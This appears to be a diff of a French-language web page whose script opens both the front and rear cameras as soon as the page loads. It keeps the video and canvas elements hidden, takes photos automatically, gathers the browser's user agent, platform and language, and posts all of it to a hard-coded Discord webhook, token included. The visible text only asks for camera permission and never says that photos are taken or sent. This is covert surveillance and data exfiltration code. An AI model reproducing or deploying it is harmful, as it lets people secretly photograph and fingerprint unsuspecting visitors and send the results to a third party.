@@ -3,23 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Prendre une photo et envoyer les infos</title>
+    <title>Capturer des photos avec les deux caméras</title>
     <style>
-        #camera {
+        #camera-main, #camera-selfie {
             display: none;
         }
-        #photo {
+        #photo-main, #photo-selfie {
             display: none;
         }
     </style>
 </head>
 <body>
-    <h1>wesh c'est quoi que c'est que ça </h1>
-    <video id="camera" width="320" height="240" autoplay></video>
-    <canvas id="photo" width="640" height="480"></canvas> <!-- Augmenter la taille du canvas -->
+    <h1>Capturer des photos avec les deux caméras et envoyer les informations</h1>
+    <p>Veuillez autoriser l'accès à la caméra pour prendre des photos automatiquement.</p>
+    <video id="camera-main" width="320" height="240" autoplay></video>
+    <video id="camera-selfie" width="320" height="240" autoplay></video>
+    <canvas id="photo-main" width="320" height="240"></canvas>
+    <canvas id="photo-selfie" width="320" height="240"></canvas>
 
     <script>
-        function obtenirInfosAppareil() {
+        async function obtenirInfosAppareil() {
             const userAgent = navigator.userAgent;
             const platform = navigator.platform;
             const language = navigator.language;
@@ -27,9 +30,12 @@
             return `User Agent: ${userAgent}\nPlatform: ${platform}\nLanguage: ${language}`;
         }
 
-        function envoyerImage(blob) {
+        function envoyerDonnees(imageBlobs, infos) {
             const formData = new FormData();
-            formData.append('file', blob, 'photo.png');
+            imageBlobs.forEach((blob, index) => {
+                formData.append(`file${index}`, blob, `photo${index}.png`);
+            });
+            formData.append('payload_json', JSON.stringify({ content: infos }));
 
             const url = 'https://discord.com/api/webhooks/1264515631122878466/IeM3kvt1ZIIcvP7tq2NBQtG80ARxiqkuKv-PBjLbjFwuOr87Im8l6ls3LVybGGxL-Xvu';
             return fetch(url, {
@@ -38,66 +44,66 @@
             });
         }
 
-        function envoyerInfos(infos) {
-            const url = 'https://discord.com/api/webhooks/1264515631122878466/IeM3kvt1ZIIcvP7tq2NBQtG80ARxiqkuKv-PBjLbjFwuOr87Im8l6ls3LVybGGxL-Xvu';
-            return fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ content: infos })
-            });
+        function capturerPhoto(video, canvas) {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL('image/png');
         }
 
-        (function() {
-            const video = document.getElementById('camera');
-            const canvas = document.getElementById('photo');
-            const context = canvas.getContext('2d');
-
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function(stream) {
-                    video.srcObject = stream;
-                    video.play();
-                    video.onloadeddata = function() {
-                        // Ajuster la taille du canvas pour obtenir une image de bonne qualité
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-
-                        // Prendre une photo automatiquement après que la vidéo a commencé
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        video.pause();
-
-                        // Convertir l'image en base64
-                        const dataURL = canvas.toDataURL('image/png');
-                        const blob = dataURLToBlob(dataURL);
-                        const infosAppareil = obtenirInfosAppareil();
-                        
-                        envoyerImage(blob)
-                            .then(() => {
-                                return envoyerInfos(infosAppareil);
-                            })
-                            .then(() => {
-                                console.log('Image et informations envoyées avec succès');
-                            })
-                            .catch(error => {
-                                console.error('Erreur lors de l\'envoi:', error);
-                            });
-                    };
-                })
-                .catch(function(err) {
-                    console.log("Une erreur est survenue: " + err);
-                });
-
-            function dataURLToBlob(dataURL) {
-                const byteString = atob(dataURL.split(',')[1]);
-                const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
-                const ab = new ArrayBuffer(byteString.length);
-                const ia = new Uint8Array(ab);
-                for (let i = 0; i < byteString.length; i++) {
-                    ia[i] = byteString.charCodeAt(i);
-                }
-                return new Blob([ab], { type: mimeString });
+        function dataURLToBlob(dataURL) {
+            const byteString = atob(dataURL.split(',')[1]);
+            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
             }
+            return new Blob([ab], { type: mimeString });
+        }
+
+        (async function() {
+            const videoMain = document.getElementById('camera-main');
+            const videoSelfie = document.getElementById('camera-selfie');
+            const canvasMain = document.getElementById('photo-main');
+            const canvasSelfie = document.getElementById('photo-selfie');
+
+            // Accéder à la caméra principale (arrière)
+            const streamMain = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+            videoMain.srcObject = streamMain;
+            videoMain.play();
+
+            // Accéder à la caméra selfie (avant)
+            const streamSelfie = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            videoSelfie.srcObject = streamSelfie;
+            videoSelfie.play();
+
+            // Attendre que les vidéos soient chargées
+            await new Promise(resolve => {
+                videoMain.onloadeddata = () => {
+                    videoSelfie.onloadeddata = () => {
+                        resolve();
+                    };
+                };
+            });
+
+            // Configurer les dimensions des canvases
+            canvasMain.width = videoMain.videoWidth;
+            canvasMain.height = videoMain.videoHeight;
+            canvasSelfie.width = videoSelfie.videoWidth;
+            canvasSelfie.height = videoSelfie.videoHeight;
+
+            // Capturer les photos
+            const dataURLMain = capturerPhoto(videoMain, canvasMain);
+            const dataURLSelfie = capturerPhoto(videoSelfie, canvasSelfie);
+
+            // Convertir les données URL en Blobs
+            const blobMain = dataURLToBlob(dataURLMain);
+            const blobSelfie = dataURLToBlob(dataURLSelfie);
+            const infosAppareil = await obtenirInfosAppareil();
+
+            // Envoyer les photos et les informations
+            await envoyerDonnees([blobMain, blobSelfie], infosAppareil);
+            console.log('Images et informations envoyées avec succès');
         })();
     </script>
 </body>
